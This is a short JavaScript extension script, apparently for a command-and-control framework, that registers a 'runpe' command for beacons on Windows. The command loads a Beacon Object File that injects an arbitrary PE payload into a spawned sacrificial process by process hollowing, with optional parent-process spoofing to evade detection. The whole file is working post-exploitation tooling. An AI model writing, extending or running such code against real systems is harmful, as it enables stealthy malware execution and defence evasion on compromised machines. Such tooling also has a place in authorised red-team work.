let name = "runpe";
let desc = "A BOF to execute a PE file in the address space of a remote process using the process hollowing technique. Supports parent proces spoofing.";

var metadata = {
    name: name,
    description: desc,
    store: true
};

var runpe_cmd = ax.create_command(
    name,
    desc,
    "runpe </path/to/hollow> </path/to/payload> <?ppid>"
);

runpe_cmd.addArgString( "pathToHollow", true, "A sacrificial process to spawn & inject the PE into." );
runpe_cmd.addArgString( "payload", true, "A path to a PE payload on your system to execute." );
runpe_cmd.addArgInt( "ppid", false, "A parent process id to spoof as the parent of the sacrificial process." );
runpe_cmd.setPreHook( function( id, cmdline, parsed_json, ...parsed_lines ) {

    let pathToHollow = parsed_json["pathToHollow"];
    let ppid         = parseInt(parsed_json["ppid"],10);
    let payload      = parsed_json["payload"];

    if (!ax.file_exists( payload )) {
        ax.console_message( id, `Invalid file path: ${payload}`, "error" );
        return false;
    }

    let params = ax.bof_pack( "cstr,int,bytes", [pathToHollow, ppid, ax.file_read(payload)] );
    let bof_path = "/home/kali/RunPE.x64.o";
    
    let message = `Tasked beacon to execute RunPE BOF against ${pathToHollow} with ${payload}`;
    if ( ppid ) {
        message += ` spoofing parent as pid ${ppid}`;
    }

    ax.execute_alias( id, cmdline, `execute bof "${bof_path}" ${params}`, message );
} );

var group = ax.create_commands_group( "RunPE", [runpe_cmd] );
ax.register_commands_group( group, ["beacon"], ["windows"], [] );
